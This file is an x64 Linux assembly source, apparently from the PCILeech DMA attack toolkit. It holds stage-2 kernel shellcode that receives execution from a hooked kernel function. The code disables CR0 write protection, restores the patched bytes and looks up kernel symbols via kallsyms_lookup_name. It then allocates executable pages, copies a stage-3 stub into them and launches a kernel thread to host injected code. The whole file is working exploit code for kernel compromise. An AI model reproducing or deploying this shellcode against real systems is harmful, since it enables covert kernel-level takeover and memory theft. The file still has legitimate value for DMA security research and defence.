; lx64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	main_pre_start:
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_kallsyms_lookup_name	dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rcx, cr0
	PUSH rcx
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: SET UP CALL STACK AND PARAMETERS
	;    r12: tmp 1 (virt addr)
	;    r13: tmp 2 (phys addr)
	;    r14: addr to kallsyms_lookup_name
	;    r15: storage for store old stack ptr (rsp)
	; ----------------------------------------------------
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	LEA r14, main_pre_start
	MOV eax, [data_offset_kallsyms_lookup_name]
	ADD r14, rax
	; ----------------------------------------------------
	; 5: CALL C CODE
	; ----------------------------------------------------
	CALL setup
	MOV rsp, r15
	POP r15
	POP r14
	POP r13
	POP r12
	; ----------------------------------------------------
	; 7: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP rax
	MOV cr0, rax
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

setup PROC
	; ----------------------------------------------------
	; 0: ALLOC PAGES
	; ----------------------------------------------------
	LEA rdi, str_alloc_pages_current
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, 14h
	MOV rsi, 2h
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 1: RETRIEVE PHYS/VIRT ADDRESSES OF PAGES
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	; ----------------------------------------------------
	; 2: SET CODE PAGE TO EXECUTABLE
	; ----------------------------------------------------
	LEA rax, main
	LEA rdi, str_set_memory_x
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, r12
	MOV rsi, 2
	CALL rax
	; ----------------------------------------------------
	; 3: CLEAR AND COPY STAGE3 PRE BINARY TO AREA
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rdi, 64
	copy_stage3_pre_loop:
	SUB rdi, 8
	LEA rax, lx64_stage3_pre
	MOV rax, [rax+rdi]
	MOV rsi, r12
	ADD rsi, 1000h
	ADD rsi, rdi
	MOV [rsi], rax
	TEST rdi, rdi
	JNZ copy_stage3_pre_loop
	; ----------------------------------------------------
	; 4: CREATE THREAD & SET UP DATA AREA
	; ----------------------------------------------------
	LEA rdi, str_kthread_create_on_node
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	XOR rdx, rdx
	SUB rdx, 1
	LEA rcx, str_pcileech
	CALL rax
	TEST rax, rax
	JZ error
	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
	MOV [r12+10h], r14   ; KMDDATA.AddrKallsymsLookupName
	; ----------------------------------------------------
	; 5: START THREAD
	; ----------------------------------------------------
	LEA rdi, str_wake_up_process
	CALL r14
	TEST rax, rax
	JZ error
	MOV rdi, [r12+58h]
	CALL rax
	TEST rax, rax
	JZ error
	; ----------------------------------------------------
	; 6: FINISH!
	;    supervisor write must be re-enabled before since
	;    some calls may have unset it.
	; ----------------------------------------------------
	MOV eax, r13d
	JMP setup_finish
	error:
	MOV eax, 0FFFFFFFFh
	setup_finish:
	MOV rcx, cr0
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	MOV [data_phys_addr_alloc], eax
	RET
setup ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; r14 -> kallsyms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	LEA rdi, str_page_offset_base
	CALL r14
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

m_phys_to_virt PROC
	PUSH rdi
	CALL m_page_offset_base
	POP rdi
	ADD rax, rdi
	RET
m_phys_to_virt ENDP

m_vmemmap_base PROC
	LEA rdi, str_vmemmap_base
	CALL r14
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

m_page_to_phys PROC
	PUSH rdi
	CALL m_vmemmap_base
	POP rdi
	SUB rdi, rax
	SHR rdi, 7		; PFN
	SHL rdi, 12
	MOV rax, rdi
	RET
m_page_to_phys ENDP

; ----------------------------------------------------
; clear_8k
; clear 8192 bytes of memory
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

; ----------------------------------------------------
; This code compiles into 53 bytes. This is copied by
; stage3 area by the setup function.
; Linux cannot use the simpler windows stage3 pre code
; since the thread will get stuck without a sleep.
; ----------------------------------------------------
lx64_stage3_pre PROC
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.qwAddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
lx64_stage3_pre ENDP

str_kthread_create_on_node	db 'kthread_create_on_node', 0
str_alloc_pages_current		db 'alloc_pages_current', 0
str_set_memory_x			db 'set_memory_x', 0
str_wake_up_process			db 'wake_up_process', 0
str_page_offset_base		db 'page_offset_base', 0
str_vmemmap_base			db 'vmemmap_base', 0
str_pcileech				db 'pcileech', 0

END
